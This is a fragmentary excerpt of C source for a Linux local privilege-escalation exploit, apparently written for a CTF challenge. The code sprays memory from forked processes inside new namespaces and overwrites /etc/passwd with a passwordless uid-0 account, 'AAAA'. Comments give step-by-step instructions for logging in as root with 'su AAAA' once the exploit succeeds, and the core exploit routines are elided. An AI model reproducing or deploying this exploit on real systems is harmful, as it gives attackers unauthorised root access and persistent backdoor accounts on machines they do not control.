 ...
 * ...
 * AAAA::0:0:root:/root:/bin/sh   <-- no password, login with just Enter
 * ctf:x:1000:1000:chal:/home/ctf:/bin/sh
 *
 * HOW TO LOGIN:
 *   su AAAA        (press Enter when asked for password)
 *   OR
 *   login: AAAA    (press Enter when asked for password)
 */
...
/*
 * CHANGED: attack_data now writes a full passwd entry with empty password field.
 *
 * Format: username:password:uid:gid:gecos:home:shell
 *   - password field is empty (no 'x'), so no /etc/shadow lookup is done.
 *   - uid=0, gid=0 means root privileges.
 *
 * To login after exploit:
 *   su AAAA          <- just press Enter at password prompt
 *   whoami           <- should print "root" (uid 0)
 */
char attack_data[] = "AAAA::0:0:root:/root:/bin/sh\n";
...
void do_exploit() {
    ...
    if (!fork()) {
        setup_namespace();
        do_exploit_spray(sync_pipe2[1][0], sync_pipe2[0][1]);
    } else {
        setup_namespace();
        do_exploit_vuln(sync_pipe2[0][0], sync_pipe2[1][1]);
    }
}
...
int main(int argc, char **argv) {
    ...
    if (!fork()) {
        ...
        if (sync == 'T') {
            ...
            /* After exploit, login with:
             *   su AAAA   <-- press Enter at password prompt
